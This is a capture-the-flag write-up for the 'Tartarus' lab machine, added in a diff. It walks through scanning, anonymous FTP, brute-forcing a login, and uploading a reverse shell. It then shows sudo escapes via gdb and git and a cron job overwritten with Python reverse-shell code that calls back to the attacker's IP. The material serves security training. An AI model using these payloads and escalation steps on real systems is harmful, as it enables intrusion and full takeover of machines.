@@ -1,0 +1,454 @@
+IP:10.10.237.55
+
+Nmap scan results:
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Tartarus# nmap -A -T4 10.10.237.55 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-17 12:16 IST
+Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 64.74% done; ETC: 12:16 (0:00:17 remaining)
+Stats: 0:01:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 95.83% done; ETC: 12:17 (0:00:00 remaining)
+Nmap scan report for 10.10.237.55
+Host is up (0.15s latency).
+Not shown: 995 closed ports
+PORT     STATE    SERVICE  VERSION
+21/tcp   open     ftp      vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.9.81.62
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open     ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
+|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
+|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
+80/tcp   open     http     Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+1093/tcp filtered proofd
+2260/tcp filtered apc-2260
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=10/17%OT=21%CT=1%CU=44568%PV=Y%DS=2%DC=T%G=Y%TM=5F8A93
+OS:85%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=104%TI=Z%CI=RD%II=I%TS=8)S
+OS:EQ(SP=103%GCD=1%ISR=105%TI=Z%CI=I%TS=8)SEQ(TI=Z%CI=RD%II=I%TS=A)OPS(O1=M
+OS:505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%
+OS:O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%
+OS:DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
+OS:0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF
+OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
+OS:%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%
+OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1720/tcp)
+HOP RTT       ADDRESS
+1   151.57 ms 10.9.0.1
+2   151.74 ms 10.10.237.55
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Tartarus# ftp 10.10.237.55
+Connected to 10.10.237.55.
+220 (vsFTPd 3.0.3)
+Name (10.10.237.55:root): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+pwd
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+226 Directory send OK.
+ftp> pwd
+257 "/" is the current directory
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
+-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+226 Directory send OK.
+ftp> cd ...
+ls
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+226 Directory send OK.
+ftp> pwd
+257 "/..." is the current directory
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
+drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ...
+226 Directory send OK.
+ftp> cd ...
+250 Directory successfully changed.
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
+226 Directory send OK.
+ftp> get yougotgoodeyes.txt
+local: yougotgoodeyes.txt remote: yougotgoodeyes.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for yougotgoodeyes.txt (14 bytes).
+226 Transfer complete.
+14 bytes received in 0.00 secs (60.4950 kB/s)
+ftp> ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
+e226 Directory send OK.
+ftp> ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 .
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
+-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
+226 Directory send OK.
+ftp> exit
+221 Goodbye.
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Tartarus# cat yougotgoodeyes.txt 
+/sUp3r-s3cr3t
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Tartarus# 
+
+Robots.txt:
+
+User-Agent: *
+Disallow : /admin-dir
+
+I told d4rckh we should hide our things deep.
+
+http://10.10.237.55/admin-dir/
+
+I got this credentials.txt and userid file.
+
+Looks interesting for our login page.(Brute force)
+
+So I did a burp intruder attack and used the grep functionality in Burp to cat out "Incorrect username".
+
+But I got "Incorrect Password" this time,this kinda looks interesting.
+
+So the username that I got was enox.
+
+So instead we can search for the password of user - enox.
+
+HTTP/1.1 200 OK
+Date: Sat, 17 Oct 2020 07:15:45 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Set-Cookie: PHPSESSID=tmjkdrhl4dv9m95mdqbek6q80s; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 19
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Incorrect password!
+
+Lets use the same credentials.txt as a password list for enox
+
+Request:
+
+POST /sUp3r-s3cr3t/authenticate.php HTTP/1.1
+Host: 10.10.237.55
+Content-Length: 35
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.10.237.55
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.237.55/sUp3r-s3cr3t/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+username=enox&password=P@ssword1234
+
+Response:
+
+HTTP/1.1 302 Found
+Date: Sat, 17 Oct 2020 07:18:21 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Set-Cookie: PHPSESSID=8kak4d14qeubjq29kso7b1qtlr; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Set-Cookie: PHPSESSID=que79n42iu4umvilps2chmcqfh; path=/
+Location: home.php
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+
+Wow we got access.
+
+http://10.10.237.55/sUp3r-s3cr3t/home.php
+
+Its a upload function,so we can upload reverse shell script.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Tartarus# dirb http://10.10.237.55/sUp3r-s3cr3t/
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Oct 17 12:53:43 2020
+URL_BASE: http://10.10.237.55/sUp3r-s3cr3t/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.237.55/sUp3r-s3cr3t/ ----
+==> DIRECTORY: http://10.10.237.55/sUp3r-s3cr3t/images/                                                                                                                                                     
++ http://10.10.237.55/sUp3r-s3cr3t/index.html (CODE:200|SIZE:732) 
+
+The uploads folder is in the images directory.
+
+root@LAPTOP-U5913CMD:/home/akshay# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.237.55 37958
+Linux ubuntu-xenial 4.4.0-184-generic #214-Ubuntu SMP Thu Jun 4 10:14:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 07:29:47 up 51 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+/bin/sh: 1: id: not found
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@ubuntu-xenial:/$ 
+
+www-data@ubuntu-xenial:/home/d4rckh$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/2 *   * * *   root    python /home/d4rckh/cleanup.py
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+www-data@ubuntu-xenial:/home/d4rckh$ 
+
+
+www-data@ubuntu-xenial:/home/d4rckh$ ls -la
+total 16
+drwxr-xr-x 2 d4rckh d4rckh 4096 Jul  5 21:35 .
+drwxr-xr-x 5 root   root   4096 Jul  5 21:45 ..
+-rwxrwxrwx 1 root   root    129 Jul  5 21:45 cleanup.py
+-rw-r--r-- 1 d4rckh d4rckh   33 Jul  5 21:45 user.txt
+www-data@ubuntu-xenial:/home/d4rckh$ 
+
+We can write some malicious stuff to cleanup.py
+
+First lets try sudo -l
+
+www-data@ubuntu-xenial:/home$ sudo -l
+Matching Defaults entries for www-data on ubuntu-xenial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu-xenial:
+    (thirtytwo) NOPASSWD: /var/www/gdb
+www-data@ubuntu-xenial:/home$ 
+
+
+sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
+We can use this to get access as thirtytwo user.
+
+
+www-data@ubuntu-xenial:/home/thirtytwo$ sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
+<e/thirtytwo$ sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit          
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+$ id
+
+uid=1004(thirtytwo) gid=1004(thirtytwo) groups=1004(thirtytwo)
+$ 
+
+$ sudo -l
+l
+Matching Defaults entries for thirtytwo on ubuntu-xenial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User thirtytwo may run the following commands on ubuntu-xenial:
+    (d4rckh) NOPASSWD: /usr/bin/git
+$ 
+
+sudo -u d4rckh /usr/bin/git branch --help config
+
+$ sudo -u d4rckh /usr/bin/git branch --help config
+sudo -u d4rckh /usr/bin/git branch --help config
+WARNING: terminal is not fully functional
+-  (press RETURN)
+GIT-BRANCH(1)                     Git Manual                     GIT-BRANCH(1)
+
+NAME
+       git-branch - List, create, or delete branches
+
+SYNOPSIS
+       git branch [--color[=<when>] | --no-color] [-r | -a]
+               [--list] [-v [--abbrev=<length> | --no-abbrev]]
+               [--column[=<options>] | --no-column]
+               [(--merged | --no-merged | --contains) [<commit>]] [--sort=<key>]
+               [--points-at <object>] [<pattern>...]
+       git branch [--set-upstream | --track | --no-track] [-l] [-f] <branchname>
+ [<start-point>]
+       git branch (--set-upstream-to=<upstream> | -u <upstream>) [<branchname>]
+       git branch --unset-upstream [<branchname>]
+       git branch (-m | -M) [<oldbranch>] <newbranch>
+       git branch (-d | -D) [-r] <branchname>...
+       git branch --edit-description [<branchname>]
+
+DESCRIPTION
+       If --list is given, or if there are no non-option arguments, existing
+       branches are listed; the current branch will be highlighted with an
+       asterisk. Option -r causes the remote-tracking branches to be listed,
+shht-branch(1) line 1 (press h for help or q to quit)!
+!/bin/sh
+$ id
+uid=1005(d4rckh) gid=1005(d4rckh) groups=1005(d4rckh)
+$ 
+
+Now we are d4rckh
+Lets see what we can do with this user.
+
+$ find / -perm -u=s -type f >/dev/null
+/var/www/gdb
+/bin/umount
+/bin/ping6
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/newgidmap
+/usr/bin/gpasswd
+/usr/bin/at
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/chsh
+$ 
+
+Lets do that cron job to get root access now.
+
+import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.9.81.62",4444));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);
+
+
+Make sure to include these two lines
+# =*- coding: utf-8 -*- *************
+#!/usr/bin/env python   *************
+
+import socket, os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.9.81.62",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+os.system("/bin/sh -i")
+
+
+d4rckh@ubuntu-xenial:/home/d4rckh$ cat cleanup.py
+# =*- coding: utf-8 -*-
+#!/usr/bin/env python
+
+import socket, os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.9.81.62",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)  
+os.system("/bin/sh -i")
+
+And we wait for incoming connections on the port 4444
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Tartarus# nc -nvlp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.202.106 34242
+
+
+# id
+/bin/sh: 2: did: not found
+# python3 -c "import pty;pty.spawn('/bin/bash')"
+root@ubuntu-xenial:~# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu-xenial:~# 
+
+
+root@ubuntu-xenial:~# cd /root
+cld /root
+root@ubuntu-xenial:~# s
+ls
+root.txt
+root@ubuntu-xenial:~# cat root.txt
+cat root.txt
+7e055812184a5f##################
+root@ubuntu-xenial:~# 
+
+Thank you :)
+
+-Voker2311
